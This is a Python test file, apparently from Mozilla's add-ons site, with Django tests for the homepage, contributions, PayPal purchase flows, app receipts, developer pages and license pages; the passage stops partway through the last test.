# -*- coding: utf-8 -*-
from cStringIO import StringIO
from datetime import datetime
from decimal import Decimal
import json
import re

from django import test
from django.conf import settings
from django.core import mail
from django.core.cache import cache
from django.test.client import Client
from django.utils.encoding import iri_to_uri

import fudge
from fudge.inspector import arg
from mock import patch
from nose import SkipTest
from nose.tools import eq_, nottest
from pyquery import PyQuery as pq
import waffle

import amo
import amo.tests
from amo.helpers import absolutify, numberfmt, urlparams, shared_url
from amo.tests import addon_factory
from amo.urlresolvers import reverse
from abuse.models import AbuseReport
from addons.models import (Addon, AddonDependency, AddonUpsell, AddonUser,
                           Charity)
from bandwagon.models import Collection
from files.models import File
from market.models import (AddonPremium, AddonPurchase, PreApprovalUser,
                           Price, PriceCurrency)
from paypal import PaypalError, PaypalDataError
from paypal.tests.test import other_error
from stats.models import Contribution
from translations.helpers import truncate
from users.helpers import users_list
from users.models import UserProfile
from versions.models import Version
from mkt.webapps.models import Installed


def norm(s):
    """Normalize a string so that whitespace is uniform."""
    return re.sub(r'[\s]+', ' ', str(s)).strip()


def add_addon_author(original, copy):
    """Make both add-ons share an author."""
    author = original.listed_authors[0]
    AddonUser.objects.create(addon=copy, user=author, listed=True)
    return author


def check_cat_sidebar(url, addon):
    """Ensures that the sidebar shows the categories for the correct type."""
    cache.clear()
    for type_ in [amo.ADDON_EXTENSION, amo.ADDON_THEME, amo.ADDON_SEARCH]:
        addon.update(type=type_)
        r = Client().get(url)
        eq_(pq(r.content)('#side-nav').attr('data-addontype'), str(type_))


@nottest
def test_hovercards(self, doc, addons, src=''):
    addons = list(addons)
    eq_(doc.find('.addon.hovercard').length, len(addons))
    for addon in addons:
        btn = doc.find('.install[data-addon=%s]' % addon.id)
        eq_(btn.length, 1)
        hc = btn.parents('.addon.hovercard')
        eq_(hc.find('a').attr('href'),
            urlparams(addon.get_url_path(), src=src))
        eq_(hc.find('h3').text(), unicode(addon.name))


class TestHomepage(amo.tests.TestCase):
    fixtures = ['base/apps']

    def setUp(self):
        self.base_url = reverse('home')

    def test_thunderbird(self):
        """Thunderbird homepage should have the Thunderbird title."""
        r = self.client.get('/en-US/thunderbird/')
        doc = pq(r.content)
        eq_('Add-ons for Thunderbird', doc('title').text())

    def test_welcome_msg(self):
        r = self.client.get('/en-US/firefox/')
        welcome = pq(r.content)('#site-welcome').remove('a.close')
        eq_(welcome.text(),
            'Welcome to Firefox Add-ons. Choose from thousands of extra '
            'features and styles to make Firefox your own.')
        r = self.client.get('/en-US/thunderbird/')
        welcome = pq(r.content)('#site-welcome').remove('a.close')
        eq_(welcome.text(),
            'Welcome to Thunderbird Add-ons. Add extra features and styles to '
            'make Thunderbird your own.')


class TestHomepageFeatures(amo.tests.TestCase):
    fixtures = ['base/users',
                'base/addon_3615',
                'base/collections',
                'base/global-stats',
                'base/featured',
                'base/collections',
                'addons/featured',
                'bandwagon/featured_collections']

    def test_no_unreviewed(self):
        response = self.client.get(reverse('home'))
        addon_lists = 'popular featured hotness personas'.split()
        for key in addon_lists:
            for addon in response.context[key]:
                assert addon.status != amo.STATUS_UNREVIEWED

    def test_seeall(self):
        Collection.objects.update(type=amo.COLLECTION_FEATURED)
        doc = pq(self.client.get(reverse('home')).content)
        browse_extensions = reverse('browse.extensions')
        browse_personas = reverse('browse.personas')
        browse_collections = reverse('collections.list')
        sections = {
            '#popular-extensions': browse_extensions + '?sort=users',
            '#featured-extensions': browse_extensions + '?sort=featured',
            '#upandcoming': browse_extensions + '?sort=hotness',
            '#featured-personas': browse_personas,
            '#featured-collections': browse_collections + '?sort=featured',
        }
        for id_, url in sections.iteritems():
            # Check that the "See All" link points to the correct page.
            eq_(doc.find('%s .seeall' % id_).attr('href'), url)


class TestPromobox(amo.tests.TestCase):
    fixtures = ['addons/ptbr-promobox']

    def test_promo_box_ptbr(self):
        # bug 564355, we were trying to match pt-BR and pt-br
        response = self.client.get('/pt-BR/firefox/', follow=True)
        eq_(response.status_code, 200)


class TestContributeInstalled(amo.tests.TestCase):
    fixtures = ['base/addon_592']

    def setUp(self):
        self.addon = Addon.objects.get(pk=592)
        self.url = reverse('addons.installed', args=['a592'])

    def test_no_header_block(self):
        # bug 565493, Port post-install contributions page
        response = self.client.get(self.url, follow=True)
        doc = pq(response.content)
        header = doc('#header')
        aux_header = doc('#aux-nav')
        # assert that header and aux_header are empty (don't exist)
        eq_(header, [])
        eq_(aux_header, [])

    def test_num_addons_link(self):
        r = self.client.get(self.url)
        a = pq(r.content)('.num-addons a')
        eq_(a.length, 1)
        author = self.addon.authors.all()[0]
        eq_(a.attr('href'), reverse('users.profile', args=[author.id]))

    def test_title(self):
        r = self.client.get(self.url)
        title = pq(r.content)('title').text()
        eq_(title.startswith('Thank you for installing Gmail S/MIME'), True)


class TestContributeEmbedded(amo.tests.TestCase):
    fixtures = ['base/addon_3615', 'base/addon_592', 'base/users']

    def setUp(self):
        self.addon = Addon.objects.get(pk=592)
        self.detail_url = self.addon.get_url_path()

    @patch('paypal.get_paykey')
    def client_post(self, get_paykey, **kwargs):
        get_paykey.return_value = ['abc', '']
        url = reverse('addons.contribute', args=kwargs.pop('rev'))
        if 'qs' in kwargs:
            url = url + kwargs.pop('qs')
        return self.client.post(url, kwargs.get('data', {}))

    def test_client_get(self):
        url = reverse('addons.contribute', args=[self.addon.slug])
        eq_(self.client.get(url, {}).status_code, 405)

    def test_invalid_is_404(self):
        """we get a 404 in case of invalid addon id"""
        response = self.client_post(rev=[1])
        eq_(response.status_code, 404)

    @fudge.patch('paypal.get_paykey')
    def test_charity_name(self, get_paykey):
        (get_paykey.expects_call()
                   .with_matching_args(memo=u'Contribution for foë: foë')
                   .returns(('payKey', 'paymentExecStatus')))
        self.addon.charity = Charity.objects.create(name=u'foë')
        self.addon.name = u'foë'
        self.addon.save()
        url = reverse('addons.contribute', args=['a592'])
        self.client.post(url)

    def test_params_common(self):
        """Test for the some of the common values"""
        response = self.client_post(rev=['a592'])
        eq_(response.status_code, 302)
        con = Contribution.objects.all()[0]
        eq_(con.charity_id, None)
        eq_(con.addon_id, 592)
        eq_(con.amount, Decimal('20.00'))

    def test_custom_amount(self):
        """Test that we have the custom amount when given."""
        response = self.client_post(rev=['a592'], data={'onetime-amount': 42,
                                                        'type': 'onetime'})
        eq_(response.status_code, 302)
        eq_(Contribution.objects.all()[0].amount, Decimal('42.00'))

    def test_ppal_json_switch(self):
        response = self.client_post(rev=['a592'], qs='?result_type=json')
        eq_(response.status_code, 200)
        response = self.client_post(rev=['a592'])
        eq_(response.status_code, 302)

    def test_ppal_return_url_not_relative(self):
        response = self.client_post(rev=['a592'], qs='?result_type=json')
        assert json.loads(response.content)['url'].startswith('http')

    def test_unicode_comment(self):
        res = self.client_post(rev=['a592'],
                            data={'comment': u'版本历史记录'})
        eq_(res.status_code, 302)
        assert settings.PAYPAL_FLOW_URL in res._headers['location'][1]
        eq_(Contribution.objects.all()[0].comment, u'版本历史记录')

    def test_organization(self):
        c = Charity.objects.create(name='moz', url='moz.com',
                                   paypal='test@moz.com')
        self.addon.update(charity=c)

        r = self.client_post(rev=['a592'])
        eq_(r.status_code, 302)
        eq_(self.addon.charity_id,
            self.addon.contribution_set.all()[0].charity_id)

    def test_no_org(self):
        r = self.client_post(rev=['a592'])
        eq_(r.status_code, 302)
        eq_(self.addon.contribution_set.all()[0].charity_id, None)

    def test_no_suggested_amount(self):
        self.addon.update(suggested_amount=None)
        res = self.client_post(rev=['a592'])
        eq_(res.status_code, 302)
        eq_(settings.DEFAULT_SUGGESTED_CONTRIBUTION,
            self.addon.contribution_set.all()[0].amount)

    def test_form_suggested_amount(self):
        res = self.client.get(self.detail_url)
        doc = pq(res.content)
        eq_(len(doc('#contribute-box input[type=radio]')), 2)

    def test_form_no_suggested_amount(self):
        self.addon.update(suggested_amount=None)
        res = self.client.get(self.detail_url)
        doc = pq(res.content)
        eq_(len(doc('#contribute-box input[type=radio]')), 1)

    @fudge.patch('paypal.get_paykey')
    def test_paypal_error_json(self, get_paykey, **kwargs):
        get_paykey.expects_call().returns((None, None))
        res = self.contribute()
        assert not json.loads(res.content)['paykey']

    @patch('urllib2.OpenerDirector.open')
    def test_paypal_other_error_json(self, opener, **kwargs):
        opener.return_value = StringIO(other_error)
        res = self.contribute()
        assert not json.loads(res.content)['paykey']

    def _test_result_page(self):
        url = self.addon.get_detail_url('paypal', ['complete'])
        doc = pq(self.client.get(url, {'uuid': 'ballin'}).content)
        eq_(doc('#paypal-result').length, 1)
        eq_(doc('#paypal-thanks').length, 0)

    def test_addons_result_page(self):
        self._test_result_page()

    def test_apps_result_page(self):
        raise SkipTest
        self.addon.update(type=amo.ADDON_WEBAPP, app_slug='xxx')
        self._test_result_page()

    @fudge.patch('paypal.get_paykey')
    def test_not_split(self, get_paykey):
        def check_call(*args, **kw):
            assert 'chains' not in kw
        (get_paykey.expects_call()
                   .calls(check_call)
                   .returns(('payKey', 'paymentExecStatus')))
        self.contribute()

    def contribute(self):
        url = reverse('addons.contribute', args=[self.addon.slug])
        return self.client.post(urlparams(url, result_type='json'))

    @fudge.patch('paypal.get_paykey')
    def test_pre_approval(self, get_paykey):
        waffle.models.Flag.objects.create(name='allow-pre-auth',
                                          everyone=True)

        user = UserProfile.objects.get(pk=999)
        pre = PreApprovalUser.objects.create(user=user)
        self.client.login(username=user.email, password='password')

        (get_paykey.expects_call()
                   .with_matching_args(preapproval=pre)
                   .returns((None, None)))
        self.contribute()


class TestPurchaseEmbedded(amo.tests.TestCase):
    fixtures = ['base/addon_592', 'base/users', 'prices']

    def setUp(self):
        waffle.models.Switch.objects.create(name='marketplace', active=True)
        waffle.models.Flag.objects.create(name='allow-pre-auth',
                                          everyone=True)
        self.addon = Addon.objects.get(pk=592)
        self.addon.update(premium_type=amo.ADDON_PREMIUM,
                          status=amo.STATUS_PUBLIC)
        self.file = File.objects.get(pk=87384)
        self.user = UserProfile.objects.get(email='regular@mozilla.com')
        AddonPremium.objects.create(addon=self.addon, price_id=1)
        self.purchase_url = reverse('addons.purchase', args=[self.addon.slug])
        self.client.login(username='regular@mozilla.com', password='password')
        self.brl = PriceCurrency.objects.create(currency='BRL',
                                                price=Decimal('0.5'),
                                                tier_id=1)

    def test_premium_only(self):
        self.addon.update(premium_type=amo.ADDON_FREE)
        eq_(self.client.post(self.purchase_url).status_code, 403)

    def test_get(self):
        eq_(self.client.get(self.purchase_url).status_code, 405)

    @patch('paypal.get_paykey')
    def test_redirect(self, get_paykey):
        get_paykey.return_value = ['some-pay-key', '']
        res = self.client.post(self.purchase_url)
        assert 'some-pay-key' in res['Location']

    @patch('paypal.get_paykey')
    def test_ajax(self, get_paykey):
        get_paykey.return_value = ['some-pay-key', '']
        res = self.client.post_ajax(self.purchase_url)
        eq_(json.loads(res.content)['paykey'], 'some-pay-key')

    @fudge.patch('paypal.get_paykey')
    def test_paykey_amount(self, get_paykey):
        def check(*args, **kw):
            return args[0]['amount'] == Decimal('0.99')
        (get_paykey.expects_call()
                   .with_args(arg.passes_test(check))
                   .returns(('some-pay-key', '')))
        self.client.post_ajax(self.purchase_url)

    @fudge.patch('paypal.get_paykey')
    def test_paykey_currency(self, get_paykey):
        def check(*args, **kw):
            return (args[0]['currency'] == 'BRL' and
                    args[0]['amount'] == Decimal('0.50'))
        (get_paykey.expects_call()
                   .with_args(arg.passes_test(check))
                   .returns(('some-pay-key', '')))
        self.client.post_ajax(self.purchase_url, data={'currency': 'BRL'})

    @fudge.patch('paypal.get_paykey')
    def test_paykey_invalid_currency(self, get_paykey):
        def check(*args, **kw):
            return (args[0]['currency'] == 'USD' and
                    args[0]['amount'] == Decimal('0.99'))
        (get_paykey.expects_call()
                   .with_args(arg.passes_test(check))
                   .returns(('some-pay-key', '')))
        self.client.post_ajax(self.purchase_url, data={'tier': 0})

    @fudge.patch('paypal.get_paykey')
    def test_paykey_error(self, get_paykey):
        get_paykey.expects_call().raises(PaypalError())
        res = self.client.post_ajax(self.purchase_url)
        assert json.loads(res.content)['error'].startswith('There was an')

    @fudge.patch('paypal.get_paykey')
    def test_paykey_unicode_error(self, get_paykey):
        get_paykey.expects_call().raises(PaypalDataError(u'Азәрбајҹан'))
        res = self.client.post_ajax(self.purchase_url)
        assert json.loads(res.content)['error'].startswith(u'Азәрбајҹан')

    @fudge.patch('paypal.get_paykey')
    def test_paykey_unicode_default(self, get_paykey):
        pde = PaypalDataError()
        pde.default = u'\xe9'
        get_paykey.expects_call().raises(pde)
        res = self.client.post_ajax(self.purchase_url)
        eq_(json.loads(res.content)['error'], u'\xe9')

    @patch('paypal.get_paykey')
    def test_paykey_contribution(self, get_paykey):
        get_paykey.return_value = ['some-pay-key', '']
        self.client.post_ajax(self.purchase_url)
        cons = Contribution.objects.filter(type=amo.CONTRIB_PENDING)
        eq_(cons.count(), 1)
        eq_(cons[0].amount, Decimal('0.99'))

    def check_contribution(self, state):
        cons = Contribution.objects.all()
        eq_(cons.count(), 1)
        eq_(cons[0].type, state)

    @patch('paypal.check_purchase')
    @patch('paypal.get_paykey')
    def post_with_preapproval(self, get_paykey, check_purchase,
                             check_purchase_result=None):
        get_paykey.return_value = ['some-pay-key', 'COMPLETED']
        check_purchase.return_value = check_purchase_result
        return self.client.post_ajax(self.purchase_url)

    def test_paykey_pre_approval(self):
        res = self.post_with_preapproval(check_purchase_result='COMPLETED')
        eq_(json.loads(res.content)['status'], 'COMPLETED')
        self.check_contribution(amo.CONTRIB_PURCHASE)

    def test_paykey_pre_approval_disagree(self):
        res = self.post_with_preapproval(check_purchase_result='No!!!')
        eq_(json.loads(res.content)['status'], 'NOT-COMPLETED')
        self.check_contribution(amo.CONTRIB_PENDING)

    @patch('paypal.check_purchase')
    @patch('paypal.get_paykey')
    def test_paykey_pre_approval_no_ajax(self, get_paykey, check_purchase):
        get_paykey.return_value = ['some-pay-key', 'COMPLETED']
        check_purchase.return_value = 'COMPLETED'
        res = self.client.post(self.purchase_url)
        self.assertRedirects(res, shared_url('addons.detail', self.addon))

    @patch('paypal.check_purchase')
    @fudge.patch('paypal.get_paykey')
    # Turning on the allow-pre-auth flag.
    @patch.object(waffle, 'flag_is_active', lambda x, y: True)
    def test_paykey_pre_approval_used(self, get_paykey, check_purchase):
        check_purchase.return_value = 'COMPLETED'
        pre = PreApprovalUser.objects.create(user=self.user, paypal_key='xyz')
        (get_paykey.expects_call()
                   .with_matching_args(preapproval=pre)
                   .returns(('some-pay-key', 'COMPLETED')))
        self.client.post_ajax(self.purchase_url)

    @patch('paypal.check_purchase')
    @fudge.patch('paypal._call')
    # Turning on the allow-pre-auth flag.
    @patch.object(waffle, 'flag_is_active', lambda x, y: True)
    def test_paykey_pre_approval_empty(self, _call, check_purchase):
        check_purchase.return_value = 'COMPLETED'
        PreApprovalUser.objects.create(user=self.user, paypal_key='')
        r = lambda s: 'receiverList.receiver(0).email' in s
        (_call.expects_call()
              .with_matching_args(arg.any(), arg.passes_test(r))
              .returns({'payKey': 'some-pay-key',
                        'paymentExecStatus': 'COMPLETED'}))
        self.client.post_ajax(self.purchase_url)

    @patch('addons.models.Addon.has_purchased')
    def test_has_purchased(self, has_purchased):
        has_purchased.return_value = True
        res = self.client.post(self.purchase_url)
        eq_(res.status_code, 403)

    @patch('addons.models.Addon.has_purchased')
    def test_not_has_purchased(self, has_purchased):
        has_purchased.return_value = False
        res = self.client.post_ajax(self.purchase_url)
        eq_(res.status_code, 200)

    def make_contribution(self, type=amo.CONTRIB_PENDING):
        return Contribution.objects.create(type=type,
                                           uuid='123', addon=self.addon,
                                           paykey='1234', user=self.user)

    def get_url(self, status):
        return reverse('addons.purchase.finished',
                       args=[self.addon.slug, status])

    @patch('paypal.check_purchase')
    def test_check_purchase(self, check_purchase):
        check_purchase.return_value = 'COMPLETED'
        self.make_contribution()
        self.client.get_ajax('%s?uuid=%s' % (self.get_url('complete'), '123'))
        cons = Contribution.objects.all()
        eq_(cons.count(), 1)
        eq_(cons[0].type, amo.CONTRIB_PURCHASE)
        assert cons[0].uuid

    @patch('paypal.check_purchase')
    def test_check_addon_purchase_error(self, check_purchase):
        check_purchase.return_value = 'ERROR'
        self.make_contribution()
        res = self.client.get_ajax('%s?uuid=%s' %
                                   (self.get_url('complete'), '123'))

        doc = pq(res.content)
        eq_(doc('#paypal-error').length, 1)
        eq_(res.context['status'], 'error')

    @patch('paypal.check_purchase')
    def test_check_addon_purchase(self, check_purchase):
        check_purchase.return_value = 'COMPLETED'
        self.make_contribution()
        res = self.client.get_ajax('%s?uuid=%s' %
                                   (self.get_url('complete'), '123'))
        eq_(AddonPurchase.objects.filter(addon=self.addon).count(), 1)
        eq_(res.context['status'], 'complete')

    @amo.tests.mobile_test
    @patch('paypal.check_purchase')
    def test_check_addon_purchase_mobile(self, check_purchase):
        with self.activate(app='mobile'):
            check_purchase.return_value = 'COMPLETED'
            self.make_contribution()
            res = self.client.get_ajax('%s?uuid=%s' %
                                   (self.get_url('complete'), '123'))
            url = shared_url('detail', self.addon)
            target = res._headers['location'][1]
            # TODO: clean up amo.tests.mobile_test and so on so that
            # self.assertRedirects will work.
            assert url in target
            assert 'complete' in target

    @amo.tests.mobile_test
    def test_check_addon_details_purchase_claimed(self):
        with self.activate(app='mobile'):
            url = urlparams(shared_url('detail', self.addon),
                            status='complete')
            res = self.client.get(url)
            eq_(pq(res.content)('div.purchase-complete').length, 1)

    @amo.tests.mobile_test
    def test_check_addon_details_cancel_claimed(self):
        with self.activate(app='mobile'):
            url = urlparams(shared_url('detail', self.addon),
                            status='cancel')
            res = self.client.get(url)
            eq_(pq(res.content)('div.purchase-cancel').length, 1)

    def test_check_cancel(self):
        self.make_contribution()
        res = self.client.get_ajax('%s?uuid=%s' %
                                   (self.get_url('cancel'), '123'))
        eq_(Contribution.objects.filter(type=amo.CONTRIB_PURCHASE).count(), 0)
        eq_(res.context['status'], 'cancel')

    @patch('paypal.check_purchase')
    def test_check_wrong_uuid(self, check_purchase):
        check_purchase.return_value = 'COMPLETED'
        self.make_contribution()
        res = self.client.get_ajax('%s?uuid=%s' %
                                   (self.get_url('complete'), 'foo'))
        eq_(res.status_code, 404)

    @patch('paypal.check_purchase')
    def test_check_pending(self, check_purchase):
        check_purchase.return_value = 'PENDING'
        self.make_contribution()
        self.client.get_ajax('%s?uuid=%s' % (self.get_url('complete'), '123'))
        eq_(Contribution.objects.filter(type=amo.CONTRIB_PURCHASE).count(), 0)

    @patch('paypal.check_purchase')
    def test_check_pending_error(self, check_purchase):
        check_purchase.side_effect = Exception('wtf')
        self.make_contribution()
        url = '%s?uuid=%s' % (self.get_url('complete'), '123')
        res = self.client.get_ajax(url)
        eq_(res.context['result'], 'ERROR')

    def test_check_thankyou(self):
        url = reverse('addons.purchase.thanks', args=[self.addon.slug])
        eq_(self.client.get(url).status_code, 403)
        self.make_contribution(type=amo.CONTRIB_PURCHASE)
        eq_(self.client.get(url).status_code, 200)

    @patch('users.models.UserProfile.has_preapproval_key')
    def test_prompt_preapproval(self, has_preapproval_key):
        url = reverse('addons.purchase.thanks', args=[self.addon.slug])
        self.make_contribution(type=amo.CONTRIB_PURCHASE)
        has_preapproval_key.return_value = False
        res = self.client.get(url)
        eq_(pq(res.content)('#preapproval').attr('action'),
            reverse('users.payments.preapproval'))

    @patch('users.models.UserProfile.has_preapproval_key')
    def test_already_preapproved(self, has_preapproval_key):
        url = reverse('addons.purchase.thanks', args=[self.addon.slug])
        self.make_contribution(type=amo.CONTRIB_PURCHASE)
        has_preapproval_key.return_value = True
        res = self.client.get(url)
        eq_(len(pq(res.content)('#preapproval')), 0)

    def test_trigger(self):
        url = reverse('addons.purchase.thanks', args=[self.addon.slug])
        self.make_contribution(type=amo.CONTRIB_PURCHASE)
        dest = reverse('downloads.watermarked', args=[self.file.pk])
        res = self.client.get('%s?realurl=%s' % (url, dest))
        eq_(res.status_code, 200)
        eq_(pq(res.content)('a.trigger_download').attr('href'), dest)

    def test_trigger_nasty(self):
        url = reverse('addons.purchase.thanks', args=[self.addon.slug])
        self.make_contribution(type=amo.CONTRIB_PURCHASE)
        res = self.client.get('%s?realurl=%s' % (url, 'http://bad.site/foo'))
        eq_(res.status_code, 200)
        eq_(pq(res.content)('a.trigger_download').attr('href'), '/foo')

    @patch('paypal.check_purchase')
    def test_result_page(self, check_purchase):
        check_purchase.return_value = 'COMPLETED'
        Contribution.objects.create(addon=self.addon, uuid='1',
                                    user=self.user, paykey='sdf',
                                    type=amo.CONTRIB_PENDING)
        url = reverse('addons.purchase.finished',
                      args=[self.addon.slug, 'complete'])
        doc = pq(self.client.get('%s?uuid=1' % url).content)
        eq_(len(doc('#paypal-thanks')), 1)

    @patch.object(settings, 'WEBAPPS_RECEIPT_KEY',
                  amo.tests.AMOPaths.sample_key())
    def test_trigger_webapp(self):
        url = reverse('addons.purchase.thanks', args=[self.addon.slug])
        self.make_contribution(type=amo.CONTRIB_PURCHASE)
        self.addon.update(type=amo.ADDON_WEBAPP, manifest_url='http://f.com')
        doc = pq(self.client.get(url).content)
        eq_(doc('.trigger_app_install').attr('data-manifest-url'),
            self.addon.manifest_url)

    @fudge.patch('paypal.get_paykey')
    def test_split(self, get_paykey):
        def check_call(*args, **kw):
            assert 'chains' not in kw
        (get_paykey.expects_call()
                   .calls(check_call)
                   .returns(('payKey', 'paymentExecStatus')))
        self.client.post('%s?%s' % (
                        reverse('addons.purchase', args=[self.addon.slug]),
                        'result_type=json'))


def setup_premium(addon):
    price = Price.objects.create(price='0.99')
    AddonPremium.objects.create(addon=addon, price=price)
    addon.update(premium_type=amo.ADDON_PREMIUM)
    return addon, price


class PaypalStart(amo.tests.TestCase):
    fixtures = ['users/test_backends', 'base/addon_3615']

    def get_profile(self):
        return UserProfile.objects.get(id=4043307)

    def setUp(self):
        self.client.get('/')
        self.data = {'username': 'jbalogh@mozilla.com',
                     'password': 'foo'}
        self.addon = Addon.objects.all()[0]
        self.url = shared_url('addons.purchase.start', self.addon)
        self.addon, self.price = setup_premium(self.addon)


@patch.object(waffle, 'switch_is_active', lambda x: True)
@patch.object(settings, 'LOGIN_RATELIMIT_USER', 10)
class TestPaypalStart(PaypalStart):

    def test_loggedout_purchased(self):
        # "Buy" the add-on
        self.addon.addonpurchase_set.create(user=self.get_profile())

        # Make sure we get a log in field
        r = self.client.get_ajax(self.url)
        eq_(r.status_code, 200)
        assert pq(r.content).find('div.login').length

        # Now, let's log in.
        res = self.client.post_ajax(self.url, data=self.data)
        eq_(res.status_code, 200)

        # Are we presented with a link to the download?
        assert pq(res.content).find('.trigger_download').length

    def test_loggedin_purchased(self):
        # Log the user in
        assert self.client.login(**self.data)

        # "Buy" the add-on
        self.addon.addonpurchase_set.create(user=self.get_profile())
        self.addon.installed.create(user=self.get_profile())

        r = self.client.get_ajax(self.url)
        eq_(r.status_code, 200)

        # This only happens if we've bought it.
        assert pq(r.content).find('.trigger_download').length

    def test_loggedout_notpurchased(self):
        # We don't want any purchases.
        AddonPurchase.objects.all().delete()

        # Make sure we're presented with a log in form.
        r = self.client.get_ajax(self.url)
        eq_(r.status_code, 200)
        assert pq(r.content).find('div.login').length

        # Now, let's log in.
        res = self.client.post_ajax(self.url, data=self.data)
        eq_(res.status_code, 200)

        # Make sure we get a link to paypal
        assert pq(res.content).find('.paypal.button').length

    def test_loggedin_notpurchased(self):
        # No purchases; logged in.
        AddonPurchase.objects.all().delete()
        assert self.client.login(**self.data)

        r = self.client.get_ajax(self.url)
        eq_(r.status_code, 200)

        # Make sure we get a link to paypal.
        assert pq(r.content).find('.paypal.button').length

    def test_no_receipt_made_yet(self):
        eq_(Installed.objects.count(), 0)
        self.test_loggedin_notpurchased()
        eq_(Installed.objects.count(), 0)

    def test_has_thanksurl(self):
        assert self.client.login(**self.data)
        res = self.client.get_ajax(self.url)
        eq_(pq(res.content).find('button.paypal').attr('data-thanksurl'),
            shared_url('addons.purchase.thanks', self.addon))

    def test_no_currency(self):
        res = self.client.get_ajax(self.url)
        eq_(pq(res.content).find('option').length, 0)

    def test_currency(self):
        self.brl = PriceCurrency.objects.create(currency='BRL',
                                                price=Decimal('0.5'),
                                                tier_id=self.price.pk)
        res = self.client.get_ajax(self.url)
        eq_(pq(res.content).find('option').length, 2)


@patch.object(waffle, 'switch_is_active', lambda x: True)
@patch.object(settings, 'LOGIN_RATELIMIT_USER', 10)
@patch('mkt.webapps.models.create_receipt', lambda x: 'receipt')
class TestPaypalStartReceipt(PaypalStart):

    def setUp(self):
        super(TestPaypalStartReceipt, self).setUp()
        self.addon.update(type=amo.ADDON_WEBAPP, status=amo.STATUS_PUBLIC,
                          premium_type=amo.ADDON_PREMIUM,
                          app_slug='foo', manifest_url='http://fooy.com')

    def test_loggedout_purchased(self):
        self.addon.addonpurchase_set.create(user=self.get_profile())
        self.addon.installed.create(user=self.get_profile())

        # Make sure we get a log in field
        r = self.client.get_ajax(self.url)
        eq_(r.status_code, 200)
        assert pq(r.content).find('div.login').length

        # Now, let's log in.
        res = self.client.post_ajax(self.url, data=self.data)
        eq_(res.status_code, 200)

        # Are we presented with a link to the download?
        link = pq(res.content).find('.trigger_app_install')
        eq_(link.attr('data-receipt'), 'receipt')

    def test_loggedin_purchased(self):
        # Log the user in
        assert self.client.login(**self.data)

        # "Buy" the add-on
        self.addon.addonpurchase_set.create(user=self.get_profile())
        self.addon.installed.create(user=self.get_profile())

        res = self.client.get_ajax(self.url)
        eq_(res.status_code, 200)

        # This only happens if we've bought it.
        link = pq(res.content).find('.trigger_app_install')
        eq_(link.attr('data-receipt'), 'receipt')


class TestDeveloperPages(amo.tests.TestCase):
    fixtures = ['base/addon_3615', 'base/addon_592',
                'base/users', 'addons/eula+contrib-addon',
                'addons/addon_228106_info+dev+bio.json',
                'addons/addon_228107_multiple-devs.json']

    def test_meet_the_dev_title(self):
        r = self.client.get(reverse('addons.meet', args=['a592']))
        title = pq(r.content)('title').text()
        eq_(title.startswith('Meet the Gmail S/MIME Developer'), True)

    def test_roadblock_title(self):
        r = self.client.get(reverse('addons.meet', args=['a592']))
        title = pq(r.content)('title').text()
        eq_(title.startswith('Meet the Gmail S/MIME Developer'), True)

    def test_meet_the_dev_src(self):
        r = self.client.get(reverse('addons.meet', args=['a11730']))
        button = pq(r.content)('.install-button a.button').attr('href')
        eq_(button.endswith('?src=developers'), True)

    def test_nl2br_info(self):
        r = self.client.get(reverse('addons.meet', args=['a228106']))
        eq_(r.status_code, 200)
        doc = pq(r.content)
        eq_(doc('.bio').html(),
            'Bio: This is line one.<br/><br/>This is line two')
        addon_reasons = doc('#about-addon p')
        eq_(addon_reasons.eq(0).html(),
            'Why: This is line one.<br/><br/>This is line two')
        eq_(addon_reasons.eq(1).html(),
            'Future: This is line one.<br/><br/>This is line two')

    def test_nl2br_info_for_multiple_devs(self):
        # Get an Add-on that has multiple developers,
        # which will trigger the else block in the template.
        r = self.client.get(reverse('addons.meet', args=['a228107']))
        eq_(r.status_code, 200)
        bios = pq(r.content)('.bio')
        eq_(bios.eq(0).html(),
            'Bio1: This is line one.<br/><br/>This is line two')
        eq_(bios.eq(1).html(),
            'Bio2: This is line one.<br/><br/>This is line two')

    def test_roadblock_src(self):
        url = reverse('addons.roadblock', args=['a11730'])
        # If they end up at the roadblock we force roadblock on them
        r = self.client.get(url + '?src=dp-btn-primary')
        button = pq(r.content)('.install-button a.button').attr('href')
        eq_(button.endswith('?src=dp-btn-primary'), True)

        # No previous source gets the roadblock page source
        r = self.client.get(url)
        button = pq(r.content)('.install-button a.button').attr('href')
        eq_(button.endswith('?src=meetthedeveloper_roadblock'), True)

    def test_roadblock_different(self):
        url = reverse('addons.roadblock', args=['a11730'])
        r = self.client.get(url + '?src=dp-btn-primary')
        button = pq(r.content)('.install-button a.button').attr('href')
        eq_(button.endswith('?src=dp-btn-primary'), True)

        contribute = pq(r.content)('#contribute-button').attr('href')
        eq_(contribute.endswith('?src=roadblock'), True)

    def test_contribute_multiple_devs(self):
        a = Addon.objects.get(pk=592)
        u = UserProfile.objects.get(pk=999)
        AddonUser(addon=a, user=u).save()
        r = self.client.get(reverse('addons.meet', args=['a592']))
        eq_(pq(r.content)('#contribute-button').length, 1)

    def test_get_old_version(self):
        url = reverse('addons.meet', args=['a11730'])
        r = self.client.get(url)
        eq_(r.context['version'].version, '20090521')

        r = self.client.get('%s?version=%s' % (url, '20080521'))
        eq_(r.context['version'].version, '20080521')

    def test_duplicate_version_number(self):
        qs = Version.objects.filter(addon=11730)
        qs.update(version='1.x')
        eq_(qs.count(), 2)
        url = reverse('addons.meet', args=['a11730']) + '?version=1.x'
        r = self.client.get(url)
        eq_(r.context['version'].version, '1.x')

    def test_purified(self):
        addon = Addon.objects.get(pk=592)
        addon.the_reason = addon.the_future = '<b>foo</b>'
        addon.save()
        url = reverse('addons.meet', args=['592'])
        r = self.client.get(url, follow=True)
        eq_(pq(r.content)('#about-addon b').length, 2)


class TestLicensePage(amo.tests.TestCase):
    fixtures = ['base/addon_3615']

    def setUp(self):
        self.addon = Addon.objects.get(id=3615)
        self.version = self.addon.current_version

    def test_legacy_redirect(self):
        r = self.client.get('/versions/license/%s' % self.version.id,
                            follow=True)
        self.assertRedirects(r, self.version.license_url(), 301)

    def test_explicit_version(self):
        url = reverse('addons.license', args=['a3615', self.version.version])
        r = self.client.get(url)
        eq_(r.status_code, 200)
        eq_(r.context['version'], self.version)

    def test_implicit_version(self):
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        eq_(r.status_code, 200)
        eq_(r.context['version'], self.addon.current_version)

    def test_no_license(self):
        self.version.update(license=None)
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
        eq_(r.status_code, 404)

    def test_no_version(self):
        self.addon.versions.all().delete()
        url = reverse('addons.license', args=['a3615'])
        r = self.client.get(url)
